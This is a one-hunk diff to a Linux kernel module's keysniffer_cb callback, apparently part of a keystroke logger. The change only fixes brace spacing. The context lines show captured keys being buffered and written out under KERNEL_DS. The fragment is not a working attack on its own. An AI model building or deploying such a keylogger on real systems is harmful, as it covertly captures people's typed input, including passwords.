@@ -182,7 +182,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 	keys_buf[buf_pos++] = '\n';
 	if (output == NULL) {
 		pr_debug("%s\n", keybuf);
-	} else{
+	} else {
 		mm_segment_t oldfs;
 		oldfs = get_fs();
 		set_fs(KERNEL_DS);
